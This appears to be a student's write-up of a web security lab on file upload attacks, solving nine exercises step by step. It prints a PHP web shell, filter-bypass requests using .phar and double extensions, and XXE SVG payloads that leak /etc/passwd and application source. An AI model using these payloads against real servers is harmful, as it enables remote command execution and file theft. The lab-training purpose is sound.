# File Upload Attacks

Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use.
However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it.

## Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is weak file validation and verification, which may not be well secured to prevent unwanted file types or could be missing altogether. The worst possible kind of file upload vulnerability is an `unauthenticated arbitrary file upload` vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, as we will see in this module, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks.

The most common and critical attack caused by arbitrary file uploads is `gaining remote command execution` over the back-end server by uploading a web shell or uploading a script that sends a reverse shell. A web shell, as we will discuss in the next section, allows us to execute any command we specify and can be turned into an interactive shell to enumerate the system easily and further exploit the network. It may also be possible to upload a script that sends a reverse shell to a listener on our machine and then interact with the remote server that way.

In some cases, we may not have arbitrary file uploads and may only be able to upload a specific file type. Even in these cases, there are various attacks we may be able to perform to exploit the file upload functionality if certain security protections were missing from the web application.

Examples of these attacks include:
- Introducing other vulnerabilities like `XSS` or `XXE`.
- Causing a `Denial of Service (DoS)` on the back-end server.
- Overwriting critical system files and configurations.
- And many others.

When the validation for the file type in upload functionality happens on the client side NOT on the server side, we can easily bypass this restriction by changing the code using dev tools in browser. So if all validation appears to be happening on the front-end, as the page never refreshes or sends any HTTP requests after selecting our file- we should be able to have complete control over these client-side validations.

# Questions & Answers
### Absent Validation
1.  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.

Create basic php webshell:
```
<?php system($_REQUEST['cmd']); ?>
```
Upload it, then go to:
```
/uploads/shell.php?=cmd=andheretypecommands

http://94.237.59.199:54252/uploads/shell.php?cmd=cat+/flag.txt
```

### Upload Exploitation
2. Try to exploit the upload feature to upload a web shell and get the content of /flag.txt 

Create a php web shell
```
<?php system($_REQUEST['cmd']); ?>
 
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

Then simply change the =id to cat+/flag.txt
```
http://SERVER_IP:PORT/uploads/shell.php?cmd=cat+/flag.txt
```


### Client-Side Validation
3.  Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)

First inspect the source code and find the lines which are responsible for allowed upload extensions:
```
 <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
```

Then in order to upload php web shell we need to add .php to the end of accept parameter so:
```
<input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png,.php">
```

Then go to debugger section in devtools and find these code:
```
function validate() {
  var file = $('#uploadFile') [0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();
  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text('Only images are allowed!');
    File.form.reset();
    $('#submit').attr('disabled', true);
    return false;
  } else {
    return true;
  }
}
```

Then ignore these lines:
```
if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text('Only images are allowed!');
    File.form.reset();
    $('#submit').attr('disabled', true);
    return false;
  } else {
    return true;
  }
```

After that return to index.html and find where uploaded photos are shown:
```
<img src="/profile_images/Untitled-1.png" class="profile-image" id="profile-image">
```

So it is http//IP:PORT/profile_images/...

After all that restrictions that we disabled, try to upload shell.php to the main website:
```
<?php system($_REQUEST['cmd']); ?>
```

After that go to http//IP:PORT/profile_images/shell.php
and add ?cmd=YOUR_COMMANDS to interact with web shell, so it look like this:
```
http//IP:PORT/profile_images/shell.php?cmd=cat+/flag.txt  
```
to read the content of flag.txt file in the / directory

### Blacklisted Filters
4. Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read “/flag.txt”.

First we upload ordinary photo with .png or .jpg extension

Then we intercept our request at http://IP:PORT/upload.php with burp

Then we change filename to shell.php and add php webshell script, so it will look like this:
```
POST /upload.php HTTP/1.1
Host: 94.237.59.193:57013
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.193:57013/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------151835042424590523114032504347
Content-Length: 260
Origin: http://94.237.59.193:57013
DNT: 1
Connection: close
-----------------------------151835042424590523114032504347
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
-----------------------------151835042424590523114032504347--
```
Then we send this request to intruder and ass fuzzing parameter to ".php" and in payload select /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
and un-tick encoding and start attack

Once our attack finished we can list result by length(since all of them returned with 200 OK code) and here we can notice that there are a lot of php extensions that came back with “File successfully uploaded”. Here i tried php2,php3,….. and lastly phar worked. So, we upload our shell as .phar file and then execute our command(as w
e did earlier we can learn the directory of uploaded shell by reading the source code).

Then go to http://IP:PORT/profile_images/shell.phar?cmd=cat+/flag.txt and get flag.txt

### Whitelist Filters
5. The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt" 

First we also fuzz for extensions, after finding that .phar is working: shell.phar.jpeg
To ffuz we will use the seclists with the following payload located in /usr/share/seclists/Discovery/Web-Content/web-extensions.php
For fuzzing we will use intruder section in burp and we will highlight the shell$.something.$jpeg with special signs in burpsuite to indicate that this is the place to fuzz

Then we intercept the request, change the file name to shell.phar.jpeg, and insert phpwebshell as in prev example and making sure that content-type is also image/jpeg

After that we go as usual to http://IP:PORT/profile_images/shell.phar.jpg?cmd=cat+/flag.txt to get the content of flag immediately, cuz we already know how to perform these commands

### Type filters
6. The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

First we also need to check for extensions that are allowed using the payload: /usr/share/seclists/Discovery/Web-Content/web-extensions.php

Then after we found out that extensions are .phar or .phtml or .pht return Status Code 200, we can now add them at the end of file name
So we upload a random image with .jpg extension, then intercept the request and burp we change the file name and extension, i.e. it was called: photo.jpg --> that means we change the file so it becomes: shell.jpg.phar or shell.phar.jpg (can not remember how server processing the request)

But in the request in the bottom you will have to add a mime time for .gif - which is GIF8 and delete the rest weird symbols of the image content you inserted and only add php web shell 
```
<?php system($_REQUEST['cmd']); ?>
```

So to sum it up In the request in burpsuite you will need to check for the following:
- Content-Type must be: image/jpeg
- File name:  shell.jpg.phar or shell.phar.jpg
- All content of weird image symbols should be removed and replaced by webshell: 
```
<?php system($_REQUEST['cmd']); ?>
```
- Then you need to send the request and turn off proxy
- Then go to view source code of the page and find where uploaded images are stored and displayed, which is in: /profile_images/youruploadedimage.jpg
- Then you change the url in the search bar of the browser to: http://IP:PORT/profile_images/shell.jpg.phar?cmd=cat+/flag.txt to read the content of flag.txt

### Limited file uploads
7. The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt" 

First we need to find on google any icon with .svg format and upload it to out form. Then intercept the request with burp and change the content of the uploaded .svg icon to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The above code can be used for an SVG image that leaks the content of (/etc/passwd):

Then we press forward the request for post and forward get request. Then go to HTTP history tab in burp and look for /GET response and we see the bunch of stuff indicating that above xxe is working:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:102:MySQL Server,,,:/nonexistent:/bin/false
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:103:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:104:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:105:107::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
```

So we now can change the content of this payload to read the content of flag.txt file:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

Again we forward this post request and after that forward get request and in http history in /GET response we see our flag


8.  Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes) 

This is very similar to prev question. The process is same but the payload is different 
We also upload the same .svg icon but change the content of it to:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

While reading systems files like /etc/passwd can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.

So after that we forward the request, forward get request and then in HTTP history we find base64 decoded source code:
```

```

After decoding in decoder tab in burp we get:
```
<?php
libxml_disable_entity_loader(false);

$svg_file = file_get_contents('./images/' . file_get_contents('./images/latest.xml'));
$doc = new DOMDocument();
$doc->loadXML($svg_file, LIBXML_NOENT | LIBXML_DTDLOAD);
$svg = $doc->getElementsByTagName('svg');
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Employee File Manager</title>
  <link rel="stylesheet" href="./style.css">
</head>

<body>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
  <script src="./script.js"></script>
  <div>
    <h1>Update your logo</h1>
    <center>
      <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
        <input type="file" name="uploadFile" id="uploadFile" accept=".svg">
        <?php echo $svg->item(0)->C14N(); ?>
        <input type="submit" value="Upload" id="submit">
      </form>
    </center>
  </div>
</body>

</html>
```

So we can now see that the directory is: ./images/


## Skills Assessment

 9. Try to exploit the upload form to read the flag found at the root directory "/". 

First we get our IP and go to the website
![](https://i.imgur.com/BsluX9W.png)


I found a form /contact for submitting with uploading functionality:
![](https://i.imgur.com/HhYj778.png)


I started to fill in the fields and tried to bypass filters but with no success


Then I decided to upload malicious XML script for XXE to get the content of php file for upload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
![](https://i.imgur.com/YKtib0M.png)

Then I got base64 decoded output of code and after decoding I got:
```
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

So we can see that files get uploaded to: /user_feedback_submissions/
Also the important point here is to name a file due to the current date ymd (year month day) i.e. 240808 and then add the actual name of the file
i.e. 240808_image.jpg

So I started to fuzz for valid extensions and found that .phar is working:
For that I send the request to intruder and used the extensions.txt wordlist from seclists
![](https://i.imgur.com/zbaC0Fh.png)
![](https://i.imgur.com/s3OVV7M.png)


Then I uploaded a random .jpg picture, changed the magic bytes to jpeg and Content-Type to: jpeg and filename to: 240808_image.phar.jpg and forwarded the request, and got this:
![](https://i.imgur.com/WYqW79P.png)



So now we need to go to list the files, to make sure that everything is working:
```
http://IP:PORT/contact/user_feedback_submissions/240808_image.phar.jpg?cmd=ls+/
```
![](https://i.imgur.com/3Y4i5pH.png)

We actually don't need to have JPG in the file name like 240808_LPG_image.phar.jpg. We can keep it 240808_image.phar.jpg like this and it will work fine

And after that we locate the flag.txt so we simply cat it
```
http://IP:PORT/contact/user_feedback_submissions/240808_image.phar.jpg?cmd=cat+/flag.txt
```
